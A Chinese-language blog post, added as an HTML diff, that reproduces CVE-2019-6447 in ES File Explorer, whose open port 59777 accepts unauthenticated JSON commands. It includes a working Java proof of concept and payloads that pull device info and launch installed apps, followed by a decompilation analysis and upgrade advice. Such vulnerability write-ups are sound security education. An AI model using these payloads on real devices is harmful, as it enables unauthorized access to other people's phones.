@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  
+  <meta name="description" content="今天看到关于ES文件浏览器的漏洞，觉得危险程度非常高，所以我简单的用java代码复现一下，首先关于ES文件浏览器，我就不多说了。非常著名的一款文件浏览器。漏洞利用就是该软件运行之后开启TCP 59777端口，该端口未关闭导致可以通过HTTP协议POST请求接收JSON数据，进行解析执行返回结果。环境">
+  
+
+  
+  
+  
+  
+  
+  
+  <title>ES文件浏览器 CVE-2019-6447 漏洞复现 | 喵神‘s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="今天看到关于ES文件浏览器的漏洞，觉得危险程度非常高，所以我简单的用java代码复现一下，首先关于ES文件浏览器，我就不多说了。非常著名的一款文件浏览器。漏洞利用就是该软件运行之后开启TCP 59777端口，该端口未关闭导致可以通过HTTP协议POST请求接收JSON数据，进行解析执行返回结果。环境：win10，IDEA，JDK 1.8.0_181，一加5，Android P，ES文件浏览器4.1">
+<meta name="keywords" content="漏洞复现">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ES文件浏览器 CVE-2019-6447 漏洞复现">
+<meta property="og:url" content="https://killer-meow.github.io/ES-File-Explorer-OpenPort-Vuln/index.html">
+<meta property="og:site_name" content="喵神‘s Blog">
+<meta property="og:description" content="今天看到关于ES文件浏览器的漏洞，觉得危险程度非常高，所以我简单的用java代码复现一下，首先关于ES文件浏览器，我就不多说了。非常著名的一款文件浏览器。漏洞利用就是该软件运行之后开启TCP 59777端口，该端口未关闭导致可以通过HTTP协议POST请求接收JSON数据，进行解析执行返回结果。环境：win10，IDEA，JDK 1.8.0_181，一加5，Android P，ES文件浏览器4.1">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://attach.52pojie.cn/forum/201901/22/083328jvsw6ie6iece9cc6.gif">
+<meta property="og:image" content="https://attach.52pojie.cn/forum/201901/22/083428mz5363hz6hwyss3z.png">
+<meta property="og:image" content="https://attach.52pojie.cn/forum/201901/22/083456h4c1dadtdt4z149b.png">
+<meta property="og:image" content="https://attach.52pojie.cn/forum/201901/22/083519vx00f6jr0pu83zov.png">
+<meta property="og:image" content="https://attach.52pojie.cn/forum/201901/22/083600ydcb19vvw1t946wx.png">
+<meta property="og:image" content="https://attach.52pojie.cn/forum/201901/22/083635qp7zzccybgcpjb9b.png">
+<meta property="og:image" content="https://attach.52pojie.cn/forum/201901/22/083654e84qp4zpjvjjz6kk.png">
+<meta property="og:image" content="https://attach.52pojie.cn/forum/201901/22/083724biq9jjri6oijj9j7.png">
+<meta property="og:updated_time" content="2019-01-31T04:14:21.625Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ES文件浏览器 CVE-2019-6447 漏洞复现">
+<meta name="twitter:description" content="今天看到关于ES文件浏览器的漏洞，觉得危险程度非常高，所以我简单的用java代码复现一下，首先关于ES文件浏览器，我就不多说了。非常著名的一款文件浏览器。漏洞利用就是该软件运行之后开启TCP 59777端口，该端口未关闭导致可以通过HTTP协议POST请求接收JSON数据，进行解析执行返回结果。环境：win10，IDEA，JDK 1.8.0_181，一加5，Android P，ES文件浏览器4.1">
+<meta name="twitter:image" content="https://attach.52pojie.cn/forum/201901/22/083328jvsw6ie6iece9cc6.gif">
+  
+  
+    <link rel="icon" href="/css/images/favicon.ico">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+  
+  <!-- baidu webmaster push -->
+  <script src="//push.zhanzhang.baidu.com/push.js"></script>
+</head></html>
+<body class="home blog custom-background custom-font-enabled single-author">
+  <div id="page" class="hfeed site">
+      <header id="masthead" class="site-header" role="banner">
+    <hgroup>
+      <h1 class="site-title">
+        <a href="/" title="喵神‘s Blog" rel="home">喵神‘s Blog</a>
+      </h1>
+      
+        <h2 class="site-description hitokoto"></h2>
+        <script type="text/javascript" src="https://v1.hitokoto.cn/?encode=js"></script>
+      
+    </hgroup>
+
+    <nav id="site-navigation" class="main-navigation" role="navigation">
+            <button class="menu-toggle">菜单</button>
+            <a class="assistive-text" href="/#content" title="跳至内容">跳至内容</a><!--TODO-->
+            <div class="menu-main-container">
+                <ul id="menu-main" class="nav-menu">
+                
+                    <li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/">Home</a></li>
+                
+                    <li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/archives">Archives</a></li>
+                
+                </ul>
+            </div>
+    </nav>
+</header>
+
+      <div id="main" class="wrapper">
+        <div id="primary" class="site-content"><div id="content" role="main"><article id="post-ES-File-Explorer-OpenPort-Vuln" class="post-ES-File-Explorer-OpenPort-Vuln post type-post status-publish format-standard hentry">
+    <!---->
+
+      <header class="entry-header">
+        
+        
+  
+    <h1 class="entry-title article-title">
+      ES文件浏览器 CVE-2019-6447 漏洞复现
+    </h1>
+  
+
+        
+        <div class="comments-link">
+            
+            <a href="javascript:void(0);" data-url="https://killer-meow.github.io/ES-File-Explorer-OpenPort-Vuln/" data-id="cjrinawbt00010ono2vl3dzo6" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+        </div><!-- .comments-link -->
+      </header><!-- .entry-header -->
+
+    <div class="entry-content">
+      
+        <h5 id="今天看到关于ES文件浏览器的漏洞，觉得危险程度非常高，所以我简单的用java代码复现一下，首先关于ES文件浏览器，我就不多说了。非常著名的一款文件浏览器。漏洞利用就是该软件运行之后开启TCP-59777端口，该端口未关闭导致可以通过HTTP协议POST请求接收JSON数据，进行解析执行返回结果。"><a href="#今天看到关于ES文件浏览器的漏洞，觉得危险程度非常高，所以我简单的用java代码复现一下，首先关于ES文件浏览器，我就不多说了。非常著名的一款文件浏览器。漏洞利用就是该软件运行之后开启TCP-59777端口，该端口未关闭导致可以通过HTTP协议POST请求接收JSON数据，进行解析执行返回结果。" class="headerlink" title="今天看到关于ES文件浏览器的漏洞，觉得危险程度非常高，所以我简单的用java代码复现一下，首先关于ES文件浏览器，我就不多说了。非常著名的一款文件浏览器。漏洞利用就是该软件运行之后开启TCP 59777端口，该端口未关闭导致可以通过HTTP协议POST请求接收JSON数据，进行解析执行返回结果。"></a>今天看到关于ES文件浏览器的漏洞，觉得危险程度非常高，所以我简单的用java代码复现一下，首先关于ES文件浏览器，我就不多说了。非常著名的一款文件浏览器。漏洞利用就是该软件运行之后开启TCP 59777端口，该端口未关闭导致可以通过HTTP协议POST请求接收JSON数据，进行解析执行返回结果。</h5><h5 id="环境："><a href="#环境：" class="headerlink" title="环境："></a>环境：</h5><pre><code>win10，IDEA，JDK 1.8.0_181，一加5，Android P，ES文件浏览器4.1.9.7.4之前(我用的4.1.8.3.1)
+</code></pre><h5 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">public class Test &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">String data = &quot;&#123;\&quot;command\&quot;:\&quot;getDeviceInfo\&quot;&#125;&quot;;</span><br><span class="line">String path = &quot;http://192.168.43.111:59777&quot;;</span><br><span class="line">        URL url = null;</span><br><span class="line">        try&#123;</span><br><span class="line">            url = new URL(path);</span><br><span class="line">            HttpURLConnection conn = (HttpURLConnection) url.openConnection();</span><br><span class="line">            conn.setRequestMethod(&quot;POST&quot;);</span><br><span class="line">            conn.setConnectTimeout(5000);</span><br><span class="line">            conn.setRequestProperty(&quot;User-Agent&quot;,&quot;curl/7.54.0&quot;);</span><br><span class="line">            conn.setRequestProperty(&quot;Accept&quot;,&quot;*/*&quot;);</span><br><span class="line">            conn.setRequestProperty(&quot;Content-Type&quot;,&quot;application/json&quot;);</span><br><span class="line">            conn.setRequestProperty(&quot;Content-Length&quot;,data.length()+&quot;&quot;);</span><br><span class="line">            conn.setRequestProperty(&quot;Connection&quot;,&quot;close&quot;);</span><br><span class="line">            conn.setDoOutput(true);</span><br><span class="line">            conn.getOutputStream().write(data.getBytes());</span><br><span class="line">            //获取响应码</span><br><span class="line">            int code = conn.getResponseCode();</span><br><span class="line">            System.out.println(&quot;响应码:&quot;+code);</span><br><span class="line">            //如果请求码为200</span><br><span class="line">            if(code == 200)&#123;</span><br><span class="line">                InputStream in = conn.getInputStream();</span><br><span class="line">                String msg = tools.transStream(in);</span><br><span class="line">                System.out.println(msg);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;catch (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h5 id="返回结果："><a href="#返回结果：" class="headerlink" title="返回结果："></a>返回结果：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;name&quot;:&quot;ONEPLUS A5000&quot;, &quot;ftpRoot&quot;:&quot;/sdcard&quot;, &quot;ftpPort&quot;:&quot;3721&quot;&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到，我们通过POST请求提交了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;command&quot;:&quot;getDeviceInfo&quot;&#125;</span><br></pre></td></tr></table></figure></p>
+<h5 id="指令，就返回了我们手机的设备信息，更甚至我们可以通过指令来打开我们设备上安装的应用程序："><a href="#指令，就返回了我们手机的设备信息，更甚至我们可以通过指令来打开我们设备上安装的应用程序：" class="headerlink" title="指令，就返回了我们手机的设备信息，更甚至我们可以通过指令来打开我们设备上安装的应用程序："></a>指令，就返回了我们手机的设备信息，更甚至我们可以通过指令来打开我们设备上安装的应用程序：</h5><p>POST提交：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;command&quot;:&quot;appLaunch&quot;, &quot;appPackageName&quot;: &quot;com.tencent.mm&quot;&#125;</span><br></pre></td></tr></table></figure></p>
+<h5 id="提交该json数据，则可以直接打开我们手机上安装的微信。见GIF图"><a href="#提交该json数据，则可以直接打开我们手机上安装的微信。见GIF图" class="headerlink" title="提交该json数据，则可以直接打开我们手机上安装的微信。见GIF图"></a>提交该json数据，则可以直接打开我们手机上安装的微信。见GIF图</h5><p><img src="https://attach.52pojie.cn/forum/201901/22/083328jvsw6ie6iece9cc6.gif" alt=""><br>漏洞简要分析：<br>本次漏洞主要在：<br>com.estrongs.fs.impl.adb.c<br>com.estrongs.android.f.a<br>这两个类里面，解压ES文件浏览器，得到4个dex文件<br><img src="https://attach.52pojie.cn/forum/201901/22/083428mz5363hz6hwyss3z.png" alt=""><br>挨个使用jadx打开搜索command关键字，找到漏洞关键位置<br>在classes2.dex中定位到com.estrongs.android.f.a<br>可以看到在a方法内<br><img src="https://attach.52pojie.cn/forum/201901/22/083456h4c1dadtdt4z149b.png" alt=""><br>通过command获取到对应的指令，然后执行相应的方法，<br>这里我就简单看一下获取设备信息的这条执指令：<br><img src="https://attach.52pojie.cn/forum/201901/22/083519vx00f6jr0pu83zov.png" alt=""><br>在这里，如果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str3.equals(&quot;getDeviceInfo&quot;)</span><br></pre></td></tr></table></figure></p>
+<p>成立，<br>则执行b这个方法，并将jSONObject传进去，我们下拉定位到b这个方法<br><img src="https://attach.52pojie.cn/forum/201901/22/083600ydcb19vvw1t946wx.png" alt=""><br>可以看到这个方法是通过StringBuilder，进行拼接设备信息，<br>和ftpPort信息，然后进行返回。在看一下启动应用程序这条指令：<br><img src="https://attach.52pojie.cn/forum/201901/22/083635qp7zzccybgcpjb9b.png" alt=""><br>可以看到如果传来指令为appLaunch，<br>则执行a这个方法，并将jSONObject传递过去，下拉定位到a这个方法，<br><img src="https://attach.52pojie.cn/forum/201901/22/083654e84qp4zpjvjjz6kk.png" alt=""><br>可以看到，他通过获取appPackageName对应的String，<br>然后进行非空判断，通过Intent将appPackageName对应的包名传入，<br>然后通过startActivity启动该应用程序。通过以上分析，我们可以看出，ES可以执行的指令还是很多的，有些危害还是比较严重的，<br>所以目前使用ES文件浏览器的，请尽快升级到最新版本。<br><img src="https://attach.52pojie.cn/forum/201901/22/083724biq9jjri6oijj9j7.png" alt=""><br>可以看到最新版是已经修复了该漏洞了。</p>
+<h4 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h4><p><a href="https://github.com/fs0c131y/ESFileExplorerOpenPortVuln" target="_blank" rel="noopener">https://github.com/fs0c131y/ESFileExplorerOpenPortVuln</a></p>
+
+      
+    </div><!-- .entry-content -->
+
+    <footer class="entry-meta">
+    <a href="/ES-File-Explorer-OpenPort-Vuln/">
+    <time datetime="2019-01-30T03:32:33.000Z" class="entry-date">
+        2019-01-30
+    </time>
+</a>
+    
+    
+  <span class="article-delim">&#8226;</span>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞复现/">漏洞复现</a></li></ul>
+
+    </footer>
+</article>
+
+
+    
+<nav class="nav-single">
+    <h3 class="assistive-text">文章导航</h3>
+    
+    
+        <span class="nav-next"><a href="/360-Router-P2-login/" rel="next">360 路由器 P2 登陆验证分析 <span class="meta-nav">→</span></a></span>
+    
+</nav><!-- .nav-single -->
+
+
+
+
+
+
+
+</div></div>
+        <div id="secondary" class="widget-area" role="complementary">
+  
+    <aside id="search" class="widget widget_search"><form role="search" method="get" accept-charset="utf-8" id="searchform" class="searchform" action="//google.com/search">
+    <div>
+        <input type="text" value="" name="s" id="s">
+        <input type="submit" id="searchsubmit" value="搜索">
+    </div>
+</form></aside>
+  
+    
+  
+    
+  
+    
+  <aside class="widget">
+    <h3 class="widget-title">Recents</h3>
+    <div class="widget-content">
+      <ul>
+        
+          <li>
+            <a href="/ES-File-Explorer-OpenPort-Vuln/">ES文件浏览器 CVE-2019-6447 漏洞复现</a>
+          </li>
+        
+          <li>
+            <a href="/360-Router-P2-login/">360 路由器 P2 登陆验证分析</a>
+          </li>
+        
+      </ul>
+    </div>
+  </aside>
+
+  
+    
+  <aside class="widget">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget-content">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/router/">router</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/漏洞复现/">漏洞复现</a><span class="tag-list-count">1</span></li></ul>
+    </div>
+  </aside>
+
+  
+    
+  <aside class="widget">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget-content tagcloud">
+      <a href="/tags/router/" style="font-size: 10px;">router</a> <a href="/tags/漏洞复现/" style="font-size: 10px;">漏洞复现</a>
+    </div>
+  </aside>
+
+  
+</div>
+      </div>
+      <footer id="colophon" role="contentinfo">
+    <p>&copy; 2019 喵神
+    All rights reserved.</p>
+    <p>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></p>
+</footer>
+    <script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"1","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/js/share.js'];</script>
+
+<script src="/js/jquery-3.3.1.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+<script src="/js/navigation.js"></script>
+
+<div id="bg"></div>
+
+  </div>
+</body>
+</html>
